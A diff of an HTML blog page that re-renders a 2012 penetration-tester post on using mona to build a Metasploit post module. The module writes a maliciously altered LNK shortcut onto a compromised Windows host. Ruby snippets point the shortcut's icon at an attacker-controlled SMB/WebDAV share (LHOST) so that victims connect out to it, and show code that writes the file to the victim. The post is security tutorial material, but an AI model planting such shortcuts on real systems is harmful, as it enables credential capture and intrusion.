@@ -7,7 +7,7 @@
 <meta name="author"
     content="mubix">
 <meta name="description"
-    content="I have been using the LNK trick I talked about in my last post for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&amp;rsquo;s target." />
+    content="I have been using the LNK trick I talked about in my last post for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&#39;s target." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <link rel="canonical" href="https://malicious.link/post/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/" />
@@ -27,7 +27,7 @@
     type="text/css">
 
 
-<link rel="stylesheet" href="https://malicious.link/scss/main.min.099699ab246bf26f50616f7c9f00c79d46110459d1bd727b2d07d6fc09ece082.css">
+<link rel="stylesheet" href="https://malicious.link/scss/main.min.48be1f41dc1d94d27b5663b2b359c895efd7696597f656e57d8f6c0e126c0563.css">
 
 
 
@@ -38,19 +38,16 @@
 <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
 <link rel="shortcut icon" href="/favicon.ico">
 <meta name="theme-color" content="#252627"><meta itemprop="name" content="Developing the LNK Metasploit post module with Mona">
-<meta itemprop="description" content="I have been using the LNK trick I talked about in my last post for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&rsquo;s target.">
-
-
+<meta itemprop="description" content="I have been using the LNK trick I talked about in my last post for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&#39;s target.">
 <meta itemprop="datePublished" content="2012-02-19T05:57:02&#43;00:00" />
 <meta itemprop="dateModified" content="2012-02-19T05:57:02&#43;00:00" />
 <meta itemprop="wordCount" content="666">
 
 
 
-<meta itemprop="keywords" content="" />
-<meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Developing the LNK Metasploit post module with Mona"/>
-<meta name="twitter:description" content="I have been using the LNK trick I talked about in my last post for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&rsquo;s target."/>
+<meta name="twitter:description" content="I have been using the LNK trick I talked about in my last post for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&#39;s target."/>
 
 
 
@@ -125,66 +122,37 @@
             
 
             <div class="post-content">
-                <p>I have been using the LNK trick I talked about in my <a href="/blog/2012/02/11/ms08_068-ms10_046-fun-until-2018">last post</a> for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&rsquo;s target.</p>
-
-<p>Of course the first place I looked was Meterpreter&rsquo;s Railgun (direct windows API calling within meterpreter). But to do it with Railgun I would have to develop a way to <a href="http://msdn.microsoft.com/en-us/library/aa969393.aspx">work with COM objects</a>. Something that I don’t believe is built into Railgun (yet… /me nudges chao-mu). The second place I looked was to see if I could just build an LNK file from scratch <a href="http://msdn.microsoft.com/en-us/library/dd871305(PROT.10).aspx">using the spec</a>.. ya…. that didn’t go so..*zzzZZZzzzzzzzZzzz</p>
-
+                <p>I have been using the LNK trick I talked about in my <a href="/blog/2012/02/11/ms08_068-ms10_046-fun-until-2018">last post</a> for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it's target.</p>
+<p>Of course the first place I looked was Meterpreter's Railgun (direct windows API calling within meterpreter). But to do it with Railgun I would have to develop a way to <a href="http://msdn.microsoft.com/en-us/library/aa969393.aspx">work with COM objects</a>. Something that I don’t believe is built into Railgun (yet… /me nudges chao-mu). The second place I looked was to see if I could just build an LNK file from scratch <a href="http://msdn.microsoft.com/en-us/library/dd871305(PROT.10).aspx">using the spec</a>.. ya…. that didn’t go so..*zzzZZZzzzzzzzZzzz</p>
 <p>Enter <a href="http://redmine.corelan.be/projects/mona">mona</a>, the <a href="http://www.corelan.be/">Corelan Team’s</a> exploit development plugin for <a href="http://immunityinc.com/products-immdbg.shtml">Immunity Debugger</a>. Now, usually it is used exactly as intended, as an exploit development tool, and I guess you could consider my use of it as an extension of that as well. But, anyways, one of Mona’s many and probably one of the least well known functions is ‘header’. What this function does is simply output a ruby version of the file broken into ASCII and binary parts. That’ll make much more sense in a sec, back to the problem. I need to recreate a file in a way I can manipulate it on the fly with enough agility to be useful to others in a post module without using the spec or Railgun to assist.</p>
-
 <p>We start off with the maliciously altered LNK file, and an up to date version of Immunity and mona:</p>
-
-<p><img src="/images/postimages/201202_mona_1.png" alt="" /></p>
-
+<p><img src="/images/postimages/201202_mona_1.png" alt=""></p>
 <p>I copied the shortcut file to the C drive so I didn’t have to specify a huge path in the mona command, and issued:</p>
-
 <p><code>“!mona header C:\autoexec.lnk”</code></p>
-
-<p><img src="/images/postimages/201202_mona_2.png" alt="" /></p>
-
+<p><img src="/images/postimages/201202_mona_2.png" alt=""></p>
 <p>As you can see, mona breaks up the binary into ‘understandable’ portions, so if it sees a string is keeps it together, if it sees unicode, it actually uses the Rex ruby libraries. You can try it yourself and scroll through the results but when I saw:</p>
-
-<pre><code class="language-ruby">header &lt;&lt; Rex::Text.to_unicode(&quot;C:\%\\\\192.168.100.100\\w00t\\bogusimage.png`&quot;)
-</code></pre>
-
-<p>I knew I was golden. Quick note: pay close attention when you edit the output of this command in a text editor, initially I didn’t notice the ‘tick’ ( ` ) at the end of the share string and it cause me a lot of grief.</p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">header <span style="color:#f92672">&lt;&lt;</span> <span style="color:#66d9ef">Rex</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Text</span><span style="color:#f92672">.</span>to_unicode(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">C:</span><span style="color:#e6db74">\</span><span style="color:#e6db74">%</span><span style="color:#ae81ff">\\</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">192.168.100.100</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">w00t</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">bogusimage.png`</span><span style="color:#e6db74">&#34;</span>)
+</code></pre></div><p>I knew I was golden. Quick note: pay close attention when you edit the output of this command in a text editor, initially I didn’t notice the ‘tick’ ( ` ) at the end of the share string and it cause me a lot of grief.</p>
 <p>Cool, so I have a bit of ruby that puts the contents of my LNK file into a ruby variable. Now what?</p>
-
 <p>Now I have 3 challenges:</p>
-
 <ol>
 <li>It needs to have a user defined target IP at the very least and anything else I work into a variable option for the user.</li>
 <li>It needs to upload the file to the exploited system.</li>
 <li>It needs to be up to code on the Metasploit coding standards</li>
 </ol>
-
 <p>Changing the line I found for the share name into this:</p>
-
-<pre><code class="language-ruby">lnk &lt;&lt; Rex::Text.to_unicode(&quot;\\\\#{datastore['LHOST']}\\#{datastore['SHARENAME']}\\#{datastore['ICONFILENAME']}`&quot;)
-</code></pre>
-
-<p>‘datastore’ is used as the container for variable set by default or by the user using the module. Adding those option for the user is pretty easy. You just add the following to the ‘register_options’ section of your module:</p>
-
-<pre><code class="language-ruby">OptAddressRange.new(&quot;LHOST&quot;, [ true, &quot;Host listening for incoming SMB/WebDAV traffic&quot;, nil]),
-OptString.new(&quot;SHARENAME&quot;, [ true, &quot;Share name on LHOST&quot;, &quot;share1&quot;]),       
-OptString.new(&quot;ICONFILENAME&quot;, [ true, &quot;File name on LHOST's share&quot;, &quot;icon.png&quot;])
-</code></pre>
-
-<p>OptAddressRange is used instead of a string because it has a bit of validation that you are actually using something that either resembles an IP address or a hostname.</p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">lnk <span style="color:#f92672">&lt;&lt;</span> <span style="color:#66d9ef">Rex</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Text</span><span style="color:#f92672">.</span>to_unicode(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">#{</span>datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;LHOST&#39;</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">#{</span>datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;SHARENAME&#39;</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">#{</span>datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;ICONFILENAME&#39;</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span><span style="color:#e6db74">&#34;</span>)
+</code></pre></div><p>‘datastore’ is used as the container for variable set by default or by the user using the module. Adding those option for the user is pretty easy. You just add the following to the ‘register_options’ section of your module:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#66d9ef">OptAddressRange</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">LHOST</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">[</span> <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Host listening for incoming SMB/WebDAV traffic</span><span style="color:#e6db74">&#34;</span>, <span style="color:#66d9ef">nil</span><span style="color:#f92672">]</span>),
+<span style="color:#66d9ef">OptString</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">SHARENAME</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">[</span> <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Share name on LHOST</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">share1</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">]</span>),       
+<span style="color:#66d9ef">OptString</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ICONFILENAME</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">[</span> <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">File name on LHOST&#39;s share</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">icon.png</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">]</span>)
+</code></pre></div><p>OptAddressRange is used instead of a string because it has a bit of validation that you are actually using something that either resembles an IP address or a hostname.</p>
 <p>Problem 1 solved. Problem 2 was just as easy, the following line:</p>
-
 <pre><code>file = client.fs.file.new(datastore['LNKFILENAME'], 'wb')
-</code></pre>
-
-<p>creates a new file on the victim, and ‘file.write(lnk)’ writes the binary contents of the ‘lnk’ variable into it.</p>
-
+</code></pre><p>creates a new file on the victim, and ‘file.write(lnk)’ writes the binary contents of the ‘lnk’ variable into it.</p>
 <p>Problem 3 is much more tricky, but here is the path to wisdom:</p>
-
 <pre><code>ruby /metasploit-directory/tools/msftidy.rb /path/to/my/module/evil.rb
-</code></pre>
-
-<p>Hope this helps spur people into trying their hand at developing some modules of their own.</p>
+</code></pre><p>Hope this helps spur people into trying their hand at developing some modules of their own.</p>
 
             </div>
         </article>
@@ -206,7 +174,7 @@ OptString.new(&quot;ICONFILENAME&quot;, [ true, &quot;File name on LHOST's share
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2019</span>
+            <span>&copy; 2020</span>
             
             <span></span>
             <span> <a href="https://malicious.link/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
